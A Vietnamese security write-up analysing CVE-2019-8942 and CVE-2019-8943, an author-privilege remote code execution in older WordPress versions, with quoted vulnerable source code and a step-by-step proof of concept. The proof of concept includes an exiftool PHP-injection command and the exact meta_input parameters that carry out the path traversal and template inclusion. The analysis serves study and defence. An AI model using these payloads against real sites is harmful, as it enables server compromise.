# CVE-2019-8942 and CVE-2019-8943: WordPress RCE (author priviledge)

## Tổng quan
**CVE-2019-8942** là lỗ hổng lợi dụng lỗi LFI kết hợp tính năng File Upload để thực hiện RCE đến máy chủ web Wordpress với quyền author. Các phiên bản Wordpress bị ảnh hưởng bao gồm trước 4.9.9 và 5.x tới trước 5.0.1, cho phép thực thi code từ xa bởi giá trị `wp_attached_file` của Post Meta có thể bị thay đổi thành một đoạn string bất kỳ, ví dụ như một đoạn string: `.jpg?file.php`. Attacker với quyền author có thể thực thi code bất kỳ bằng upload các file ảnh chứa mã độc PHP trong Exif metadata. Khai thác có thể tận dụng CVE-2019-8943.  

Ở **CVE-2019-8943**, Wordpress tới phiên bản 5.0.3 bị lỗ hổng Path traversal tại phương thức `wp_crop_image()`. Attacker với quyền sử dụng chức năng cắt ảnh (author) có thể tiến hành ghi file ảnh ra bất kỳ thư mục nào dựa vào tên file chứa 2 extension như `.jpg?/../../file.jpg`.

## Điều kiện khai thác
- Web app sử dụng Wordpress với phiên bản <= 4.9.8 hoặc 5.0.0.
- Tài khoản user với quyền `author`.

## Phân tích chi tiết
Nguyên nhân chủ yếu dẫn tới việc user có thể thực hiện RCE nằm ở lỗi Post meta có thể bị ghi đè. 

Meta data có thể hiểu là những dữ liệu mô tả về dữ liệu, cụ thể trong trường hợp này, meta data là các thông tin về blog như: tiêu đề, ngày đăng, tên tác giả,...

Trong mã nguồn của Wordpress phiên bản 4.9.8, khi một image được cập nhật, hàm `edit_post()` sẽ được gọi tới. Điều đáng lưu ý ở đây, hàm này thao tác trực tiếp với mảng `$_POST`. `wp_update_post` trực tiếp lấy `$post_data` làm tham số mà không kiểm tra các trường dữ liệu được phép chỉnh sửa. 

```php=
function edit_post( $post_data = null ) {
	global $wpdb;
	if ( empty($post_data) )
		$post_data = &$_POST;
...
	if ( isset($post_data['meta']) && $post_data['meta'] ) {
		foreach ( $post_data['meta'] as $key => $value ) {
			if ( !$meta = get_post_meta_by_id( $key ) )
				continue;
			if ( $meta->post_id != $post_ID )
				continue;
			if ( is_protected_meta( $meta->meta_key, 'post' ) || ! current_user_can( 'edit_post_meta', $post_ID, $meta->meta_key ) )
				continue;
			if ( is_protected_meta( $value['key'], 'post' ) || ! current_user_can( 'edit_post_meta', $post_ID, $value['key'] ) )
				continue;
			update_meta( $key, $value['key'], $value['value'] );
		}
	}
...
	update_post_meta( $post_ID, '_edit_last', get_current_user_id() );
	$success = wp_update_post( $post_data );
	if ( ! $success && is_callable( array( $wpdb, 'strip_invalid_text_for_column' ) ) ) {
		$fields = array( 'post_title', 'post_content', 'post_excerpt' );
		foreach ( $fields as $field ) {
			if ( isset( $post_data[ $field ] ) ) {
				$post_data[ $field ] = $wpdb->strip_invalid_text_for_column( $wpdb->posts, $field, $post_data[ $field ] );
			}
		}
		wp_update_post( $post_data );
	}
```
> wp-admin/includes/post.php

User có quyền post bài có thể tiến hành ghi đè vào các giá trị Post Meta. Cụ thể hơn, attacker có thể chỉnh sửa giá trị của meta data `_wp_attached_file`. Việc này sẽ không làm thay đổi tên file nó chỉ thay đổi file mà Wordpress thao tác tới khi tiến hành chỉnh sửa. Dẫn tới khai thác Path Traversal.
![](https://i.imgur.com/4KwCpaQ.png)

> `wp_postmeta` trước khi tiến hành khai thác

Có thể thấy file upload lên có định dạng `YYYY/MM/name.jpg`, wordpress tiến hành lưu file tại thư mục `YYYY/MM/`, ta có thể liên tưởng tới khai thác Path Traversal.

Tại hàm `wp_crop_image()`, khi user `author` tiến hành cắt ảnh, Wordpress sẽ tiến hành kiểm tra để đảm bảo ảnh có tồn tại theo 2 cách, cách đầu tiên, tìm kiếm ảnh dựa trên `_wp_attached_file` trong thư mục `wp-content/uploads`.

```php=
function wp_crop_image( $src, $src_x, $src_y, $src_w, $src_h, $dst_w, $dst_h, $src_abs = false, $dst_file = false ) {
	$src_file = $src;
	if ( is_numeric( $src ) ) { // Handle int as attachment ID
		$src_file = get_attached_file( $src );
		if ( ! file_exists( $src_file ) ) {
			// If the file doesn't exist, attempt a URL fopen on the src link.
			// This can occur with certain file replication plugins.
			$src = _load_image_to_edit_path( $src, 'full' );
		} else {
			$src = $src_file;
		}
	}

	$editor = wp_get_image_editor( $src );
...
function get_attached_file( $attachment_id, $unfiltered = false ) {
	$file = get_post_meta( $attachment_id, '_wp_attached_file', true );
```
> wp-admin/includes/image.php

Nếu phương thức trên fail, Wordpress sẽ thực hiển tải ảnh từ chính server của nó, bằng cách generate URL chứa đường dẫn tới thư mục `wp-content/uploads` và filename chứa trong `_wp_attached_file`. Việc tiến hành thử download ảnh thay vì lấy trực tiếp từ local bởi trong 1 số trường hợp, một số plugin sẽ generate ảnh khi URL kia được gửi đi.

Khi Wordpress tải thành công ảnh qua phương thức `wp_get_image_editor()` việc cắt ảnh sẽ được diễn ra. Ảnh được cắt ra sau đó sẽ được lưu vào hệ thống file. Filename sẽ là giá trị biến `$src` được trả về từ `get_post_meta()` chịu sử kiểm soát của attacker. Wordpress sẽ tạo 1 thư mục bằng phương thức `wp_mkdir_p()` (Dòng 9), và lưu ảnh tại đây bằng `save()`. Có thể thấy phương thức `save()` không hề kiểm tra khai thác Path Traversal.

```php=
...
$src = $editor->crop( $src_x, $src_y, $src_w, $src_h, $dst_w, $dst_h, $src_abs );
if ( is_wp_error( $src ) )
	return $src;

if ( ! $dst_file )
	$dst_file = str_replace( basename( $src_file ), 'cropped-' . basename( $src_file ), $src_file );

wp_mkdir_p( dirname( $dst_file ) );

$dst_file = dirname( $dst_file ) . '/' . wp_unique_filename( dirname( $dst_file ), basename( $dst_file ) );

$result = $editor->save( $dst_file );
```

Việc sử dụng payload truyền vào `_wp_attached_file` chứa các ký tự `#/../../` sẽ không tồn tại đường dẫn như vậy nếu sử dụng cách load ảnh 1, do đó Wordpress sẽ thực hiện cách 2 để load ảnh là generate URL để download ảnh. Tại đây đường dẫn sẽ có dạng `http://localhost/wp-admin/wp-content/uploads/YYYY/MM/name.jpg#/name.jpg`, do đây là đường dẫn URL, các ký tự sau `#` (biểu thị fragment) sẽ được bỏ qua. Filename được tìm thấy sẽ là `name.jpg#/name.jpg` trong đó `name.jpg#` là một thư mục và đây là một tên hợp lệ. Tiếp theo sử dụng payload như `/name.jpg#/../../name.jpg` tiến hành khai thác Path Traversal.

![](https://i.imgur.com/dfeSDWA.png)
> Có thể thấy các trường giá trị như `_wp_attach_file` hay `_wp_page_template` đã được sửa đổi

**Path Traversal to RCE**
Mỗi một trang Wordpress sẽ sử dụng 1 loại theme đồng thời sẽ có 1 folder `/wp-content/themes/theme_name/` chứa các file template. Trong một số trường hợp, việc lựa chọn theme cho một bài post là khả thi. User chỉ cần set `_wp_page_template` trong bảng Post Meta thành filename mong muốn. Tuy vậy nó có hạn chế là chỉ hiệu lực với các file nằm trong thư mục theme. Thông thường thư mục này không thể bị truy cập và upload file lên. Tuy nhiên ta có thể lợi dụng khai thác Path Traversal để tiến hành ghi file vào thư mục này. Attacker `author` sẽ tiến hành tạo một bài post và tiến hành ghi đè file ảnh  vào giá trị của parameter `_wp_page_template`. File ảnh sẽ được chèn vào mã độc PHP, khi ảnh được load lên, mã PHP sẽ theo đó được thực thi -> RCE.

## Demo PoC
Step 1: Sử dụng `wpscan` để xác định theme mà trang web sử dụng => `twentyseventeen`
![](https://i.imgur.com/Sgc7FHt.png)


Step 2: Tiến hành chèn mã độc PHP vào ảnh bằng tool `Exiftool`
`exiftool demo.jpg -documentname="<?php phpinfo();?>"`
![](https://i.imgur.com/nVYxxaG.png)


Step 3: Đăng nhập vào site admin với tài khoản `author`, tới chức năng Media -> Add new -> Upload ảnh.
![](https://i.imgur.com/Dd3B1Dl.png)

Step 4: Truy cập vào ảnh. Bấm `Edit more details`
![](https://i.imgur.com/mbEbxs4.jpg)

Step 5: Bấm `Update` và dùng Burpsuite tiến hành intercept request -> Send to repeater
![](https://i.imgur.com/6LANKIG.jpg)

![](https://i.imgur.com/uOTwh0C.png)

Step 6: Bấm `Edit image` tiến hành crop ảnh và bấm `Save`. Intercept request lưu ảnh và Send to repeater.
![](https://i.imgur.com/NqJ91sZ.png)

![](https://i.imgur.com/I3QbAHP.png)

Step 7: Sử dụng request ở `Step 5`, thêm parameter `&meta_input[_wp_attached_file]=YYYY/MM/file.jpg#/file` vào request, Request này sẽ chuẩn bị tiến hành tạo folder `file.jpg#` và cop ảnh `file` vào thư mục này.

Step 8: Gửi request ở `Step 6` để lưu ảnh. Thấy thư mục `file.jpg#` đã được tạo và ảnh được lưu vào thư mục `YYYY/MM/file.jpg#`.

Step 9: Tương tự bước 7, sử dụng request ở `Step 5`, thêm parameter `&meta_input[_wp_attached_file]=YYYY/MM/file.jpg#/../../../../themes/twentyseventeen/file` vào request. Do biết được cấu trúc thư mục của Wordpress và tên theme, ta có thể tạo ra được payload như trên.
![](https://i.imgur.com/uEXa5Vz.png)

Step 10: Gửi request ở `Step 6` để lưu ảnh. Thấy được ảnh được lưu theo đường dẫn mới.
![](https://i.imgur.com/DB9S7Mo.png)

Step 11: Tới chức năng Posts -> Add new. Click `Publish`. Intercept request và Send to repeater.
![](https://i.imgur.com/2kpEOkE.png)

Step 12: Sử dụng request ở `Step 11`, thêm parameter `&meta_input[_wp_page_template]=cropped image` trong đó `cropped image` là tên file ảnh ở `Step 10`.
![](https://i.imgur.com/vsloIQ8.png)

Step 13: Truy cập vào post trên và thấy mã độc trong ảnh được thực thi.
![](https://i.imgur.com/oyK4nZR.png)

**Payload với 3 requests được sử dụng:**
```
&meta_input[_wp_attached_file]=year/month/file#/file
&meta_input[_wp_attached_file]=year/month/file#/../../../../themes/twentyseventeen/file
&meta_input[_wp_page_template]=<cropped image>
```

## Tham khảo
- [https://github.com/brianwrf/WordPress_4.9.8_RCE_POC](https://github.com/brianwrf/WordPress_4.9.8_RCE_POC)
- [https://viblo.asia/p/phan-tich-cve-2019-8942-cua-wordpress-bWrZnVrYZxw](https://viblo.asia/p/phan-tich-cve-2019-8942-cua-wordpress-bWrZnVrYZxw)
- [https://blog.sonarsource.com/wordpress-image-remote-code-execution?redirect=rips](https://blog.sonarsource.com/wordpress-image-remote-code-execution?redirect=rips)
- [https://pentest-tools.com/blog/wordpress-remote-code-execution-exploit-cve-2019-8942](https://pentest-tools.com/blog/wordpress-remote-code-execution-exploit-cve-2019-8942)